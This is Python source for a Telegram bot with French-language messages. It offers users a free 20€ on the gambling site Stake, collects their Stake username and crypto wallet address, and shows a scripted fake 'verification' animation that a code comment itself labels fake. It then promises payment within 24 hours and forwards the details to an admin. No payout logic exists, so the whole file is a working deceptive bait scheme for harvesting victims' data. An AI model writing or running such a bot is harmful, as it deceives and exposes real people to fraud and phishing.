import os
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, ConversationHandler

TOKEN = os.getenv("TOKEN")
ADMIN_ID = os.getenv("ADMIN_ID")

if not TOKEN:
    raise ValueError("TOKEN manquant")

# États
STAKE_USERNAME, WALLET = range(2)

# /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎁 Bienvenue pour réclamer tes 20€ gratuits !\n\n"
        "📝 Envoie ton pseudo Stake :"
    )
    return STAKE_USERNAME

# pseudo stake
async def get_stake(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["stake"] = update.message.text

    await update.message.reply_text(
        "💰 Envoie maintenant ton adresse wallet (SOL / ETH / BTC) :"
    )
    return WALLET

# wallet + fake animation
async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["wallet"] = update.message.text

    msg = await update.message.reply_text("🔍 Vérification du wallet...")

    await asyncio.sleep(2)
    await msg.edit_text("🔎 Recherche des correspondances...")
    await asyncio.sleep(2)
    await msg.edit_text("📡 Analyse en cours...")
    await asyncio.sleep(2)

    await msg.edit_text(
        "✅ Demande envoyée !\n\n"
        "💸 Tes fonds seront envoyés sous 24h si aucun problème détecté.\n\n"
        "⚠️ Problèmes possibles :\n"
        "• Double compte\n"
        "• Conditions de wager non respectées\n"
        "• Informations incorrectes"
    )

    # envoi admin
    if ADMIN_ID:
        try:
            await context.bot.send_message(
                chat_id=int(ADMIN_ID),
                text=(
                    "📥 Nouvelle demande\n\n"
                    f"👤 Stake: {context.user_data['stake']}\n"
                    f"🏦 Wallet: {context.user_data['wallet']}"
                ),
            )
        except:
            pass

    return ConversationHandler.END

# cancel
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Annulé.")
    return ConversationHandler.END

def main():
    app = Application.builder().token(TOKEN).build()

    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            STAKE_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_stake)],
            WALLET: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_wallet)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv)
    app.run_polling()

if __name__ == "__main__":
    main()
